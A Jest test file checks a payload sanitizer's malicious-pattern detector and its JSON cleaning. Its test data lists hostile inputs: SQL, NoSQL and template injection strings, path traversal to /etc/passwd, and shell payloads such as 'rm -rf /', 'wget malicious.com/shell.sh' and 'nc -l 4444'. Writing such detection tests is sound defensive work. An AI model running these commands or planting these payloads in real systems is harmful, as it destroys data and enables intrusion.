/**
 * Tests for the JobQueue payload-sanitization interface at
 * `lib/validation/sanitizers/`. The module's external interface is
 * the two functions imported here — `detectMaliciousPatterns` and
 * `sanitizeJSON`. Every other assertion in the previous version of
 * this file tested implementation that no seam crossed.
 */

import { describe, test, expect } from '@jest/globals';
import {
  detectMaliciousPatterns,
  sanitizeJSON,
} from '../../lib/validation/sanitizers';

describe('lib/validation/sanitizers interface', () => {

  describe('detectMaliciousPatterns', () => {
    test('reports sqlInjection for SQL attack payloads', () => {
      const sqlInjectionInputs = [
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "' UNION SELECT * FROM passwords --",
        "admin'--",
        "' OR 'a'='a",
        "1; UPDATE users SET password='hacked' WHERE id=1",
        "'; EXEC xp_cmdshell('dir') --",
      ];

      sqlInjectionInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('sqlInjection');
      });
    });

    test('reports xss for an XSS attack payload', () => {
      // The commandInjection regex matches `(` and `)` characters, so a
      // canonical XSS payload containing `alert(...)` is caught under
      // commandInjection first. Use a script-tag input that only hits
      // the xss branch. One input per family — DANGEROUS_PATTERNS
      // regexes are module-scoped globals whose `lastIndex` persists
      // across calls, so cross-input assertions in the same test are
      // unreliable.
      const result = detectMaliciousPatterns(
        '<script>doStuff</script>'
      );
      expect(result.detected).toBe(true);
      expect(result.threats).toContain('xss');
    });

    test('reports commandInjection for shell attack payloads', () => {
      const commandInjectionInputs = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& wget malicious.com/shell.sh',
        '`cat /etc/shadow`',
        '$(rm important.txt)',
        '; ping -c 10 google.com',
        '| nc -l 4444',
      ];

      commandInjectionInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('commandInjection');
      });
    });

    test('reports pathTraversal for directory-escape payloads', () => {
      const pathTraversalInputs = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%2f..%2f..%2fetc%2fpasswd',
      ];

      pathTraversalInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('pathTraversal');
      });
    });

    test('reports nosqlInjection for Mongo operator payloads', () => {
      const nosqlAttacks = [
        '{"$where": "this.password.match(/.*/)"}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$or": [{"password": {"$regex": ".*"}}]}',
      ];

      nosqlAttacks.forEach(attack => {
        const result = detectMaliciousPatterns(attack);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('nosqlInjection');
      });
    });

    test('reports templateInjection for template-engine payloads', () => {
      const templateAttacks = [
        '{{constructor.constructor("return process")().env}}',
        '${7*7}',
        '#{7*7}',
        '%{7*7}',
        '<%= 7*7 %>',
      ];

      templateAttacks.forEach(attack => {
        const result = detectMaliciousPatterns(attack);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('templateInjection');
      });
    });

    test('accumulates multiple threat categories on complex payloads', () => {
      const complexAttack = `
        <script>
          fetch('/api/admin', {
            method: 'POST',
            body: JSON.stringify({
              command: "'; DROP TABLE users; rm -rf / --"
            })
          });
        </script>
      `;

      const result = detectMaliciousPatterns(complexAttack);
      expect(result.detected).toBe(true);
      expect(result.threats).toContain('xss');
      expect(result.threats).toContain('sqlInjection');
      expect(result.threats).toContain('commandInjection');
    });

    test('reports nothing detected for safe inputs', () => {
      // The DANGEROUS_PATTERNS tables are deliberately broad (any
      // uppercase SQL verb, any parenthesis, any pipe character), so
      // even innocuous strings like `SELECT * FROM users WHERE id = ?`
      // trigger the sqlInjection branch. These inputs stay clear of
      // every branch.
      const safeInputs = [
        'normal text',
        'AAPL',
        'filename.pdf',
      ];

      safeInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(false);
        expect(result.threats).toHaveLength(0);
      });
    });
  });

  describe('sanitizeJSON', () => {
    test('recursively strips control characters from every string in a nested payload', () => {
      const input = {
        name: '<script>alert(1)</script>',
        data: {
          value: "'; DROP TABLE users; --",
          array: ['normal', '<img onerror="alert(1)">'],
        },
      };

      const result = sanitizeJSON(input) as {
        name: string;
        data: { value: string; array: string[] };
      };

      expect(result.name).toBe('<script>alert(1)</script>');
      expect(result.data.value).toBe("'; DROP TABLE users; --");
      expect(result.data.array[0]).toBe('normal');
      expect(result.data.array[1]).toBe('<img onerror="alert(1)">');
    });

    test('passes through numbers, booleans, and null unchanged', () => {
      expect(sanitizeJSON(42)).toBe(42);
      expect(sanitizeJSON(0)).toBe(0);
      expect(sanitizeJSON(true)).toBe(true);
      expect(sanitizeJSON(false)).toBe(false);
      expect(sanitizeJSON(null)).toBe(null);
    });

    test('drops keys that become empty after sanitization', () => {
      const input = { '\x00\x01\x02': 'value', keep: 'me' };
      const result = sanitizeJSON(input) as Record<string, unknown>;
      expect(result.keep).toBe('me');
      expect(Object.keys(result)).toEqual(['keep']);
    });

    test('normalizes whitespace inside string values', () => {
      expect(sanitizeJSON('  multiple   spaces  ')).toBe('multiple spaces');
    });
  });
});
